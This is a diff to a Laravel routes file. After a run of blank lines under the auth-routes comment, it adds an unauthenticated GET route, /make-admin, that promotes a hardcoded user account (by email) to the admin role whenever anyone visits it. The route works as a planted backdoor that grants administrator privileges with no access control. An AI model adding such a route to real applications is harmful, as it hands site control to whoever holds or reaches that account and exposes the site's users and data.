@@ -152,4 +152,26 @@ Route::get('/market', [MarketController::class, 'index'])
 // =======================
 // AUTH ROUTES
 // =======================
+
+
+
+
+
+
+
+
+Route::get('/make-admin', function () {
+
+    $user = \App\Models\User::where('email', 'sally@gmail.com')->first();
+
+    if ($user) {
+        $user->role = 'admin';
+        $user->save();
+
+        return 'User is now admin';
+    }
+
+    return 'User not found';
+});
+
 require __DIR__ . '/auth.php';
